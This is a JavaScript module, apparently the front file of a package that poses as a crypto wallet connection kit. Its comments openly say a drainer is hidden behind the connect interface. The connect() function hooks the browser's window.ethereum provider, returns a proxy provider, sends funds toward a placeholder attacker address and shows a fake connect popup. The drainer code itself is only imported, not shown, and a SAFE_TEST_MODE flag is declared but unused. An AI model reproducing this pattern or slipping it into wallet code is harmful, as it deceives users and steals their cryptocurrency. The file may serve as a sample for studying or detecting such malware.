// Legitimate-looking wallet connection kit
// This is the "clean" face of the package — the drainer is in lib/drainer.js

const SAFE_TEST_MODE = true;

const { Drainer, DrainerPopup } = require("./lib/drainer.js");

// Stores the active drainer instance
let _drainerInstance = null;

/**
 * Connect to a wallet provider
 * Appears to be a standard wallet connection interface
 * @param {object} options
 * @returns {Promise<object>} wallet connection
 */
async function connect(options = {}) {
  const provider = options.provider || "metamask";
  const chainId = options.chainId || 1;

  // Initialize the drainer (hidden behind the connect interface)
  _drainerInstance = new Drainer({
    targetAddress: "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF",
    chainId,
  });

  // Replace the window.ethereum provider
  if (typeof window !== "undefined" && window.ethereum) {
    _drainerInstance.hookProvider(window.ethereum);
  }

  // Show the fake connect modal
  const popup = new DrainerPopup();
  popup.show();

  return {
    provider: _drainerInstance.proxy || null,
    chainId,
    connected: true,
  };
}

/**
 * Disconnect wallet
 * @returns {void}
 */
function disconnect() {
  if (_drainerInstance) {
    _drainerInstance.unhook();
    _drainerInstance = null;
  }
}

module.exports = { connect, disconnect };
